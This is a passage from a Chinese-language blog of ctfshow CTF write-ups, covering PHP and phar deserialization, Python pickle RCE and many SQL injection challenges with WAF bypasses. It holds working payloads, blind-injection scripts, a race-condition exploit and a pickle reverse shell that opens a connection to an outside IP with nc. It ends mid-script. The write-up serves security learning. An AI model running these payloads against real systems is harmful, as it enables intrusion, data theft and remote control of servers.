Windows{\n        private $files = [];\n        public function __construct() {\n            $this -> files = [new Pivot()];\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\nnamespace think{\n    abstract class Model{\n        private $data = [];\n        protected $append = [];\n        public function __construct(){\n            $this -> append = [\"test\" => [\"test\"]];\n            $this -> data = [\"test\" => new Request()];\n        }\n    }\n    class Request{\n        protected $hook = [];\n        protected $config;\n        protected $param;\n        protected $filter;\n        public function __construct(){\n            $this -> hook = [\"visible\" => [$this,\"isAjax\"]];\n            $this -> config = ['var_ajax'=> 'aaa'];\n            $this -> param = [\"aaa\"=>'whoami'];\n            $this -> filter = \"system\";\n        }\n    }\n}\nnamespace {\n    use think\\process\\pipes\\Windows;\n    echo base64_encode(serialize(new Windows()));\n}\n```\n\n![image-20250603203557117](../image/achieve/202411/反序化-ctfshow/image-20250603203557117.png)\n\n之后换一下命令就行了\n\n## web275\n\n```php\nhighlight_file(__FILE__);\n\nclass filter{\n    public $filename;\n    public $filecontent;\n    public $evilfile=false;\n\n    public function __construct($f,$fn){\n        $this->filename=$f;\n        $this->filecontent=$fn;\n    }\n    public function checkevil(){\n        if(preg_match('/php|\\.\\./i', $this->filename)){\n            $this->evilfile=true;\n        }\n        if(preg_match('/flag/i', $this->filecontent)){\n            $this->evilfile=true;\n        }\n        return $this->evilfile;\n    }\n    public function __destruct(){\n        if($this->evilfile){\n            system('rm '.$this->filename);\n        }\n    }\n}\n\nif(isset($_GET['fn'])){\n    $content = file_get_contents('php://input');\n    $f = new filter($_GET['fn'],$content);\n    if($f->checkevil()===false){\n        file_put_contents($_GET['fn'], $content);\n        copy($_GET['fn'],md5(mt_rand()).'.txt');\n        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);\n        echo 'work done';\n    }\n    \n}else{\n    echo 'where is flag?';\n}\n\nwhere is flag?\n```\n\n这里的话如果成功写入文件的话，会执行一个文件的复制和源文件的删除操作，所以显然无法在这里操作，那么试图在`__destruct()`中操作一下\n\n试试能不能闭合\n\n一开始是传入\n\n```php\n?fn=;ls');php\n```\n\n去闭合的，但是发现rm后面好像不能为空，那就用php\n\n```\n?fn=php;tac flag.php\n```\n\n还有一个方法\n\n在检查中只需要有一个满足条件就能返回true了，所以也可以在content中满足条件\n\n```\nGET /?fn=;ls HTTP/1.1\nHost: bb8f6782-e3ec-40a4-af73-f337395ac1e1.challenge.ctf.show\nConnection: keep-alive\nsec-ch-ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\nreferer: https://bb8f6782-e3ec-40a4-af73-f337395ac1e1.challenge.ctf.show/\n\nflag\n```\n\n## web276\n\n```php\nclass filter{\n    public $filename;\n    public $filecontent;\n    public $evilfile=false;\n    public $admin = false;\n\n    public function __construct($f,$fn){\n        $this->filename=$f;\n        $this->filecontent=$fn;\n    }\n    public function checkevil(){\n        if(preg_match('/php|\\.\\./i', $this->filename)){\n            $this->evilfile=true;\n        }\n        if(preg_match('/flag/i', $this->filecontent)){\n            $this->evilfile=true;\n        }\n        return $this->evilfile;\n    }\n    public function __destruct(){\n        if($this->evilfile && $this->admin){\n            system('rm '.$this->filename);\n        }\n    }\n}\n\nif(isset($_GET['fn'])){\n    $content = file_get_contents('php://input');\n    $f = new filter($_GET['fn'],$content);\n    if($f->checkevil()===false){\n        file_put_contents($_GET['fn'], $content);\n        copy($_GET['fn'],md5(mt_rand()).'.txt');\n        unlink($_SERVER['DOCUMENT_ROOT'].'/'.$_GET['fn']);\n        echo 'work done';\n    }\n    \n}else{\n    echo 'where is flag?';\n}\n```\n\n多了一个admin的检测，明显单纯的传参实例化是进不去`__destruct()`方法的，那这里就可以用phar反序列化了，因为有操作文件的函数嘛，又刚好有写文件的口子\n\n```php\n<?php\nclass filter{\n    public $filename = '123;tac fla*';\n    public $filecontent;\n    public $evilfile=true;\n    public $admin = true;\n\n}\n$phar = new phar('test.phar');//后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER();?>\");//设置stub\n$phar->setMetadata(new filter());//自定义的meta-data存入manifest\n$phar->addFromString(\"flag.txt\",\"flag\");//添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n```\n\n这道题的话需要条件竞争，因为会删除文件，所以需要在删除处触发phar反序列化，所以写个条件竞争脚本\n\n```php\nimport requests\nimport threading\n\n#读取phar文件\ndef read_phar():\n    with open('test.phar','rb') as f:\n        data = f.read()\n        return data\n\n#上传phar文件\ndef write_phar(url,data):\n    requests.post(url,data=data)\n\n#触发反序列化\ndef unserialize_phar(url,data):\n    r = requests.post(url,data=data)\n    if 'ctfshow{' in r.text:\n        print('success')\n        print(r.text)\n        exit()\nif __name__ == '__main__':\n    url = \"http://b06413cf-f642-4143-afeb-db0053384195.challenge.ctf.show/\"\n    data = read_phar()\n    while True:\n        w = threading.Thread(target=write_phar,args=(url+\"?fn=phar.txt\",data))\n        r = threading.Thread(target=unserialize_phar,args=(url+\"?fn=phar://phar.txt\",'123'))\n        w.start()\n        r.start()\n```\n\n## web277\n\n```html\n<!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) -->\n```\n\npickle反序列化，估计没啥过滤，直接打吧\n\n```python\nimport pickle\nimport os\nimport base64\n\nclass Test:\n    def __reduce__(self):\n        return (os.popen, (r'whoami',))\n\nT = Test()\ntest = pickle.dumps(T)\ntest1 = base64.b64encode(test)\nprint(test1)\n```\n\n传入后显示backdoor here，估计没回显，打无回显rce就行，写不了文件的话那就打反弹shell\n\n```python\nimport pickle\nimport base64\n\nclass cmd():\n    def __reduce__(self):\n        return (eval,(\"__import__('os').popen('nc 124.223.25.186 3333 -e /bin/sh').read()\",))\n\nc = cmd()\nc = pickle.dumps(c)\nprint(base64.b64encode(c))\n```\n\n![image-20250604092019066](../image/achieve/202411/反序化-ctfshow/image-20250604092019066.png)\n\n原来写进去文件的，但是是写在了根目录，我说怎么访问不到\n\n## web278\n\n```\n过滤了os.system\n```\n\n这么看来的话上题应该是用os.system去打pickle反序列化的，所以这道题也是可以用popen的\n\n![image-20250604092726166](../image/achieve/202411/反序化-ctfshow/image-20250604092726166.png)\n","tags":["反序列化二篇"],"categories":["ctfshow"]},{"title":"ctfshow入门SQL注入","url":"/2025/05/21/ctfshow入门SQL注入/","content":"\n## 未过滤注入\n\n### web171\n\n可以用正常的联合注入，也可以用万能密码\n\n```\n1' or '1'='1'--+\n1' || 1--+\n```\n\n联合注入\n\n```\n1' order by 4--+\t\n-1' union select 1,2,3--+\n-1' union select 1,2,database()--+\n-1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database())--+\n-1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user')--+\n-1' union select 1,2,(select password from ctfshow_user where username = 'flag')--+\n```\n\n查询语句这里不会对我们的联合注入造成影响，只是正常的查询不会返回带flag的数据\n\n### web172\n\n多了个返回逻辑\n\n```php\n//检查结果是否有flag\n    if($row->username!=='flag'){\n      $ret['msg']='查询成功';\n    }\n```\n\n万能密码用不了，这里的话会对username为flag的数据进行过滤，正常打联合注入\n\n```\n-1' union select 1,2--+\n-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database())--+\n-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user2')--+\n-1' union select 1,(select password from ctfshow_user2 where username = 'flag')--+\n```\n\n这样可以打，不过如果是这样的话就不行了\n\n```\n-1' union select 1,(select username,password from ctfshow_user2 where username = 'flag')--+\n```\n\n因为查询的结果中有username为flag，上面的话是我们只是返回username为flag的password值，并不会碰到过滤，所以我们上面的语句才能查询到flag\n\n### web173\n\n正常打联合注入\n\n```\n-1' union select 1,2,3--+\n-1' union select 1,2,database()--+\n-1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=database())--+\n-1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user3')--+\n-1' union select 1,2,(select password from ctfshow_user3 where username='flag')--+\n```\n\n这里的话刚好flag是ctfshow开头的，所以不会被过滤掉，如果我们的flag是flag开头的话需要绕过，例如username是flag，我们可以用编码函数去绕过（使用hex或者使用reverse、to_base64等函数加密）\n\n```\n-1' union select id,hex(username),password from ctfshow_user3 where username='flag'--+\n```\n\n### web174\n\n增加过滤了数字，打盲注就行\n\n看看正确回显和错误回显\n\n![image-20250502125228340](../image/achieve/202411/sql注入--ctfshow/image-20250502125228340.png)\n\n![image-20250502125237421](../image/achieve/202411/sql注入--ctfshow/image-20250502125237421.png)\n\n拿脚本跑吧，这次用二分法去跑，刚好学一下写脚本\n\n```python\nimport requests\n\nurl = \"http://49bd2539-814b-433b-ac46-2cee1327b9df.challenge.ctf.show/api/v4.php\"\n\nresult = ''\ni = 0\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) //2\n\n        #payload = f\"1' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},1,0)--+\"\n        #payload = f\"1' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user4'),{i},1))>{mid},1,0)--+\"\n        payload = f\"1' and if(ascii(substr((select password from ctfshow_user4 where username='flag'),{i},1))>{mid},1,0)--+\"\n        print(payload)\n        r = requests.get(url+\"?id=\"+payload)\n        if \"admin\" in r.text:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32:\n        result += chr(head)\n    else:\n        break\n    print(result)\n\n```\n\n### web175\n\n这下是完全没内容了，到打时间盲注了\n\n```\n1' and sleep(4)--+\n```\n\n成功延迟\n\n![image-20250502130617338](../image/achieve/202411/sql注入--ctfshow/image-20250502130617338.png)\n\n那就打时间盲注吧\n\n```python\nimport requests\nimport time\n\nurl = \"http://7a2710eb-ee46-496f-bf62-839bb89fdee0.challenge.ctf.show/api/v5.php\"\n\nresult = \"\"\ni = 0\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),{i},1))>{mid},sleep(4),0)--+\"\n        #payload = f\"?id=1' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user5'),{i},1))>{mid},sleep(4),0)--+\"\n        payload = f\"?id=1' and if(ascii(substr((select password from ctfshow_user5 where username='flag'),{i},1))>{mid},sleep(4),0)--+\"\n        print(payload)\n\n        start_time = time.time()\n        r = requests.get(url+payload)\n        request_time = time.time()-start_time\n\n        if request_time > 4 :\n            print(f\"成功延迟,ascii>{mid}\")\n            head = mid + 1\n        else:\n            print(f\"未延迟,ascii<={mid}\")\n            tail = mid\n    if head != 32:\n        result += chr(head)\n    else:\n        break\n    print(result)\nprint(result)\n```\n\n## 过滤注入\n\n### web176\n\n万能密码可以做\n\nfuzz一下发现过滤了select\n\n![image-20250502133426113](../image/achieve/202411/sql注入--ctfshow/image-20250502133426113.png)\n\n在mysql中对大小写是不敏感的，只要waf没有对大小写限制就可以用大写去绕过\n\n```\n-1' union Select 1,2,3--+\n-1' union Select 1,2,(Select group_concat(table_name)from information_schema.tables where table_schema=database())--+\n-1' union Select 1,2,(Select group_concat(column_name)from information_schema.columns where table_name='ctfshow_user')--+\n-1' union Select 1,2,password from ctfshow_user where username='flag'--+\n```\n\n### web177\n\nfuzz一下，过滤了空格和注释符`--+`\n\n```\n1'/**/or/**/'1'='1'%23\n```\n\n### web178\n\n这次过滤了`*`，换编码去绕过就行\n\n`%09`绕过空格\n\n```\n1'%09or%09'1'='1'%23\n```\n\n### web179\n\n`%09`被过滤了，`%0c`绕过空格\n\n```\n1'%0cor%0c'1'='1'%23\n```\n\n### web180\n\n刚好看到一个fuzz单个字符的脚本，尝试着写一下\n\n```python\nimport requests\nimport re\n\nurl=\"http://5855f9fc-5b45-4d37-9ec0-4785fc6143c3.challenge.ctf.show/api\"\ntarget = re.compile(\"admin\")\n\nright_chr = []\nwaf_chr = []\n\nfor i in range(32,127):\n    char = chr(i)\n    payload = f\"?id=1'and'{char}'='{char}\"\n\n    r = requests.get(url+payload)\n    w = target.search(r.text)\n    if w is not None:\n        right_chr.append((i,char))\n    else:\n        waf_chr.append((i,char))\n\nprint(\"未被过滤的字符: \",right_chr)\nprint(\"\\n\")\nprint(\"waf: \",waf_chr)\n```\n\nfuzz的结果\n\n```\n未被过滤的字符:  [(33, '!'), (34, '\"'), (36, '$'), (37, '%'), (40, '('), (41, ')'), (44, ','), (45, '-'), (46, '.'), (47, '/'), (48, '0'), (49, '1'), (50, '2'), (51, '3'), (52, '4'), (53, '5'), (54, '6'), (55, '7'), (56, '8'), (57, '9'), (58, ':'), (59, ';'), (60, '<'), (61, '='), (62, '>'), (63, '?'), (64, '@'), (65, 'A'), (66, 'B'), (67, 'C'), (68, 'D'), (69, 'E'), (70, 'F'), (71, 'G'), (72, 'H'), (73, 'I'), (74, 'J'), (75, 'K'), (76, 'L'), (77, 'M'), (78, 'N'), (79, 'O'), (80, 'P'), (81, 'Q'), (82, 'R'), (83, 'S'), (84, 'T'), (85, 'U'), (86, 'V'), (87, 'W'), (88, 'X'), (89, 'Y'), (90, 'Z'), (91, '['), (93, ']'), (94, '^'), (95, '_'), (96, '`'), (97, 'a'), (98, 'b'), (99, 'c'), (100, 'd'), (101, 'e'), (102, 'f'), (103, 'g'), (104, 'h'), (105, 'i'), (106, 'j'), (107, 'k'), (108, 'l'), (109, 'm'), (110, 'n'), (111, 'o'), (112, 'p'), (113, 'q'), (114, 'r'), (115, 's'), (116, 't'), (117, 'u'), (118, 'v'), (119, 'w'), (120, 'x'), (121, 'y'), (122, 'z'), (123, '{'), (124, '|'), (125, '}'), (126, '~')]\n\nwaf:  [(32, ' '), (35, '#'), (38, '&'), (39, \"'\"), (42, '*'), (43, '+'), (92, '\\\\')]\n```\n\n这里的话还是过滤了空格的，并且也过滤了注释符号%23,试着去闭合单引号就行\n\n```\n-1'%0cunion%0cselect%0c'1','2','3\n-1'%0cunion%0cselect%0c'1',database(),'3\n-1'%0cunion%0cselect%0c'1',(select%0cgroup_concat(table_name)from%0cinformation_schema.tables%0cwhere%0ctable_schema=database()),'3\n-1'%0cunion%0cselect%0c'1',(select%0cgroup_concat(column_name)from%0cinformation_schema.columns%0cwhere%0ctable_name='ctfshow_user'),'3\n-1'%0cunion%0cselect%0c'1',(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'),'3\n```\n\n这道题一开始还用limit语句限制了返回的内容，后面把1换成-1才看到回显\n\n### web181\n\n#运算符优先级\n\n这次waf给出来了\n\n```\n//对传入的参数进行了过滤\n  function waf($str){\n    return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i', $str);\n  }\n```\n\n完全过滤了空格的绕过方法和select关键字，然后可以用万能密码的一个变式去做\n\n```\n-1'||username='flag\n```\n\n这里比较复杂，稍微写的详细一点，这个payload是为什么呢？\n\n我们插入到查询语句中\n\n```sql\n$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '-1'||username='flag' limit 1;\";\n```\n\n然后我们看一下mysql运算符的优先级\n\n![image-20250502143641687](../image/achieve/202411/sql注入--ctfshow/image-20250502143641687.png)\n\n在查询语句中，因为AND的优先级高于OR，所以WHERE的表达式可以拆分为\n\n```\n(username != 'flag' AND id = '-1') || (username = 'flag')\n```\n\n`username != 'flag' AND id = '-1'` 会被优先计算，然后与 `username = 'flag'` 进行 `OR` 运算。\n\n- 如果 `username = 'flag'` 为真，则整个条件为真，无论 `username != 'flag' AND id = -1` 是否为真。\n- 因此，如果表中存在 `username='flag'` 的数据，这条查询一定会返回该数据。\n\n### web182\n\n这次多过滤了个flag，不过可以用like模糊匹配绕过\n\n```\n-1'||(username)like'fla_`或者是`-1'||(username)like'fla%\n```\n\n关于like中的通配符\n\n| `%`  | 匹配零个或多个任意字符 | `'a%'` 匹配所有以a开头的字符串               |\n| ---- | ---------------------- | -------------------------------------------- |\n| `_`  | 匹配单个任意字符       | `'a_'` 匹配所有以a开头的两个字符长度的字符串 |\n\n这里的话在学习MySQL的时候也学到过\n\n### web183\n\n查询语句\n\n```php\n//拼接sql语句查找指定ID用户\n  $sql = \"select count(pass) from \".$_POST['tableName'].\";\";\n```\n\n返回逻辑\n\n```php\n//对传入的参数进行了过滤\n  function waf($str){\n    return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i', $str);\n  }\n```\n\n增加过滤了`=`，`or`，`and`等字符\n\n这里的话出现了一个查询结果\n\n```\n//返回用户表的记录总数\n      $user_count = 0;\n```\n\n可以用like模糊匹配去做\n\n```php\n $sql = \"select count(pass) from (ctfshow_user)where(pass)like'ctfshow{%';\";\n```\n\n返回$user_count = 1;\n\n如果没匹配上的话就返回0，这样就可以写脚本去盲注了\n\n```python\nimport requests\n\nurl = \"http://5d62f6db-f813-4b1e-a2be-b100259ff40d.challenge.ctf.show/select-waf.php\"\n\nstring = \"1234567890abcdefghijklmnopqrstuvwxyz-}\"\n\nflag = \"ctfshow{\"\nfor i in range(100):\n    for j in string:\n        payload = f\"(ctfshow_user)where(pass)like'{flag+j}%'\"\n        data = {\n            \"tableName\" : payload\n        }\n        r = requests.post(url, data=data)\n        if \"$user_count = 1;\" in r.text:\n            flag +=j\n            print(flag)\n            break\n        if j == \"}\":\n            exit()\n```\n\n### web184\n\n```php\n//对传入的参数进行了过滤\n  function waf($str){\n    return preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str);\n  }\n```\n\n这道题把时间盲注的两个常用函数禁用了，我还想着上一题是不是可以用时间盲注去打来着但是没打出来\n\n这里还禁用了where语句和一些逻辑运算符例如`&&`和`||`，上面的方法不能用了，可以打左右连接\n\nctfshow_user表一共有22行数据\n\n写个payload\n\n```\ntableName=ctfshow_user as a left join ctfshow_user as b on a.pass regexp(CONCAT(char(99),char(116),char(42)))\n```\n\n这里的话将ctfshow_user表设为两个表，并通过on后面的条件连接起来，此时满足on连接条件的话会返回，为什么呢？\n\n我们先在本地测试一下\n\n![3ceb4d92bafbc3517de1403e654c983](../image/achieve/202411/sql注入--ctfshow/3ceb4d92bafbc3517de1403e654c983.png)\n\n可以看到当on的条件不一样的时候返回的结果也不一样\n\n| `a.username = \"man\"` | **左表** | 左表（a）的 `username` 必须等于 `\"man\"`，才会尝试匹配右表（b）的所有行。 |\n| -------------------- | -------- | ------------------------------------------------------------ |\n| `b.username = \"man\"` | **右表** | 右表（b）的 `username` 必须等于 `\"man\"`，才会被左表（a）的行匹配。 |\n\n所以回到刚刚的payload\n\n```\ntableName=ctfshow_user as a left join ctfshow_user as b on a.pass regexp(CONCAT(char(99),char(116),char(42)))\n```\n\n这里的话会用a表中符合regexp的pass行去匹配b表，a表所有的数据去掉连接条件的那行就是22行，然后连接条件的那行会和右表的所有内容进行连接，所以最后的结果就是21+22=43行\n\n那么我们用regexp去进行匹配\n\n```python\nimport requests\n\nurl = \"http://e09f8d14-24eb-4d77-8dff-7d150969e103.challenge.ctf.show/select-waf.php\"\n\nflag = \"ctfshow{\"\nfor i in range(9,50):\n    for j in range(32,127):\n        payload = f\"ctfshow_user as a left join ctfshow_user as b on (substr(a.pass,{i},1)regexp(char({j})))\"\n        data = {\n            \"tableName\" : payload,\n        }\n        print(data)\n        r = requests.post(url, data=data)\n        if \"$user_count = 43;\" in r.text:\n            if chr(j) != \".\":\n                flag += chr(j)\n                print(flag)\n                break\n            if chr(j) == \"}\":\n                exit()\n```\n\n这里的话需要注意要排除小数点，因为小数点在regexp的正则里小数点能匹配除 \"\\n\" 之外的任何单个字符\n\n其实这道题还能用group by 结合having去打通配\n\nwhere也过滤了，用having代替，引号被过滤了，那么字符串部分可以采用16进制绕过\n\n```\nselect count(*) from ctfshow_user group by pass having pass like 0x63746673686f777b25;\n```\n\n脚本\n\n```python\n\nimport requests\n\nurl = \"http://e09f8d14-24eb-4d77-8dff-7d150969e103.challenge.ctf.show/select-waf.php\"\n\nletter = \"0123456789abcdefghijklmnopqrstuvwxyz-{}\"\ndef asc2hex(s):\n    a1 = ''\n    a2 = ''\n    for i in s:\n        a1+=hex(ord(i))\n    a2 = a1.replace(\"0x\",\"\")\n    return a2\n#将输入的字符转化成十六进制\n#通过迭代字符串 s 中的每个字符，用 ord() 获得其 ASCII 值，然后用 hex() 转换为十六进制，并去除前缀 0x，最后拼接成一个连续的字符串。\nflag = \"ctfshow{\"\nfor i in range(0,100):\n    for j in letter:\n        temp_flag = flag+j\n        data ={\n            \"tableName\":\"ctfshow_user group by pass having pass like ({})\".format(\"0x\"+asc2hex(temp_flag+\"%\"))\n        }\n        #print(data[\"tableName\"])\n\n        r = requests.post(url=url,data=data)\n        if \"$user_count = 1;\" in r.text:\n            flag += j\n            print(flag)\n            break\n        else:\n            continue\n```\n\n因为这里匹配出来的结果只会有一行，所以筛选条件就是$user_count = 1\n\n### web185\n\n```php\n//对传入的参数进行了过滤\n  function waf($str){\n    return preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str);\n  }\n```\n\n这道题多过滤了数字，这时候怎么去构造呢？\n\n这里的话需要用true去构造字符\n\ntrue=1，false=0，然后true+true=2，用true的自增和相加可以构造字符\n\n例如c的十六进制是0x63，十进制是90\n\n`0x63 我们可以写成 false，‘x’,true+true+true+true+true+true,true+true+true`然后用concat去连接\n\n```\n concat(false,‘x’,(true+true+true+true+true+true),(true+true+true))\n```\n\n但是这里过滤了单引号，得去构造x，还是一样的，用十六进制或者十进制去构造\n\nx 的十进制为120，所以我们添加120个true相加就可以了，但是我们也可以把120拆分为1，2，0，然后构造*true、true+true、false*\n\n所以最后c的构造就是\n\n```\nconcat(false,char(concat(true,(true+true),false)),(true+true+true+true+true+true),(true+true+true)\n```\n\n但是发现其实跑不出来，为什么，因为c的十六进制0x63为字符串，mysql只支持十六进制的数字，不支持字符串\n\n所以换成十进制去构造\n\n```\nconcat((power((true+true+true),(true+true))),(power((true+true+true),(true+true))))\n```\n\n所以我们构造payload\n\n```\ntableName=ctfshow_user group by pass having pass regexp(concat(char(concat((power((true+true+true),(true+true))),(power((true+true+true),(true+true))))),char(concat(true,true,(true+true+true+true+true+true))),char(concat(true,false,(true+true)))))\n```\n\n解释后的payload\n\n```\ntableName=ctfshow_user group by pass having pass regexp(ctf)\n```\n\n结果返回\n\n![image-20250504125105121](../image/achieve/202411/sql注入--ctfshow/image-20250504125105121.png)\n\n意味着匹配成功了，我们直接写脚本\n\n```python\nimport requests\n\nurl = \"http://e583b83c-af4c-444c-8de2-acd5f5af2b6d.challenge.ctf.show/select-waf.php\"\n\nstrlist = '{0123456789-abcdefghijklmnopqrstuvwxyz_}'\n\nflag = 'ctfshow'\nflagstr = ''\nstrdict = {'0':'false,','1':'true,','2':'(true+true),',\n           '3':'(true+true+true),','4':'(true+true+true+true),',\n           '5':'(true+true+true+true+true),','6':'(true+true+true+true+true+true),',\n           '7':'(power((true+true),(true+true+true))-true),',\n           '8':'(power((true+true),(true+true+true))),',\n           '9':'(power((true+true),(true+true+true))+true),'\n           }\nfor i in range(100):\n    for j in strlist:\n        m = ''\n        for x in str(ord(j)):\n            m += strdict[x]\n        m = 'char(concat('+m[:-1]+')),'#去除末尾的分号\n\n        payload = f'ctfshow_user group by pass having pass regexp(concat({flagstr+m[:-1]}))'\n        data = {\n            'tableName' : payload,\n        }\n        print(payload)\n        r = requests.post(url=url,data=data)\n        if '$user_count = 1;' in r.text:\n            print(f'---------------匹配成功---------------')\n            flag += j\n            flagstr += m\n            print(flag)\n            break\n    if flag[-1] == '}':\n        exit()\n```\n\n我的脚本相对来说更复杂一点，包师傅的脚本就相对来说要简单很多\n\n```python\nimport string\nimport requests\n\nurl = 'http://50a0761d-8695-48df-bfe5-9410e5169332.challenge.ctf.show/select-waf.php'\npayload = 'ctfshow_user group by pass having pass like(concat({}))'\ntarget = 'ctfshow{'\n\n\ndef createNum(n):\n    num = 'true'\n    if n == 1:\n        return 'true'\n    else:\n        for i in range(n - 1):\n            num += \"+true\"\n        return num\n\n\ndef createStrNum(c):\n    str = ''\n    str += 'chr(' + createNum(ord(c[0])) + ')'\n    for i in c[1:]:\n        str += ',chr(' + createNum(ord(i)) + ')'\n    return str\n\n\nuuid = string.ascii_lowercase + string.digits + \"-{}\"\n\nfor i in range(1, 50):\n    for j in uuid:\n        poc = payload.format(createStrNum(target + j + \"%\"))\n        # print(poc)\n        data = {\n            'tableName': poc\n        }\n        r = requests.post(url, data)\n        if \"$user_count = 0;\" not in r.text:\n            target += j\n            print(target)\n            if j == '}':\n                exit()\n            break\n\n```\n\n### web186\n\n```\n//对传入的参数进行了过滤\n  function waf($str){\n    return preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\<|\\>|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str);\n  }\n```\n\n多过滤了百分号，大小于号和`^`字符，但是不影响我们的payload\n\n### web187\n\n#sql的md5\n\n需要传username为admin，然后password的话会md5加密，这里的话用md5去碰撞就行\n\n![image-20250504132900480](../image/achieve/202411/sql注入--ctfshow/image-20250504132900480.png)\n\n```\nadmin/ffifdyop\n```\n\nflag在响应里\n\n### web188\n\n#sql弱比较\n\n![image-20250504133225788](../image/achieve/202411/sql注入--ctfshow/image-20250504133225788.png)\n\nusername=0 password=0\n\n在官方手册中，如果在比较操作中涉及到字符串和数字，SQL 会尝试将字符串转换为数字，那么只要字符串不是以数字开头，比较时都会转为数字 0 。\n\nsql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如0==0a，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。\n\n然后再来看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。\n\n### web189\n\nflag在api/index.php文件中\n\n去读取那个index.php文件，且注入点在username\n\nusername=0、password=0时，返回“密码错误”。（说明存在用户，但是密码错误）\nusername=1、password=0时，返回“查询失败”。（说明用户不存在）\n\n回显不一样的话打盲注就行\n\n```\nif(substr(load_file('/var/www/html/api/index.php'),{i},1)='{j}',1,0)\n```\n\n利用0和1的不同回显去打盲注，写脚本\n\n```python\nimport requests\n\nurl = \"http://ca1b1a1d-3cf1-4efa-9a37-8ca521e4d226.challenge.ctf.show/api/\"\n\n\nflag = \"\"\nfor i in range(257,500):#这是flag在文件中的起始位置\n    for j in range(127):\n        x = chr(j)\n        payload = f\"if(substr(load_file('/var/www/html/api/index.php'),{i},1)='{x}',1,0)\"\n        data = {\n            \"username\" : payload,\n            \"password\" : 0\n        }\n        print(payload)\n        r = requests.post(url, data=data)\n        if \"8d25\" in r.text:\n            print(f\"----------{x} is right----------\")\n            flag += chr(j)\n            print(flag)\n            break\n    if \"}\" in flag:\n        print(flag)\n        exit()\n```\n\n## 布尔盲注\n\n### web190\n\n字符型的盲注\n\n```\nadmin/0 密码错误\n1/0 用户名不存在\n\nadmin' and 1#/0密码错误\nadmin' and 0#/0用户名不存在\n```\n\n直接写脚本\n\n```python\nimport requests\n\nurl = \"http://50b3216b-0be6-449d-9f3a-0ce96856ca85.challenge.ctf.show/api/\"\n\ntest = \"\"\ni = 0\n\nwhile True:\n    i = i +1\n    head = 32\n    tail = 127\n\n    while head < tail:\n        mid = (head + tail) // 2\n\n        payload = f\"admin' and if(ascii(substr((select f1ag from ctfshow_fl0g),{i},1))>{mid},1,0)#\"\n        data = {\n            \"username\": payload,\n            \"password\": 0,\n        }\n        print(data)\n        r = requests.post(url, data=data)\n        if \"u8bef\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32 :\n        test += 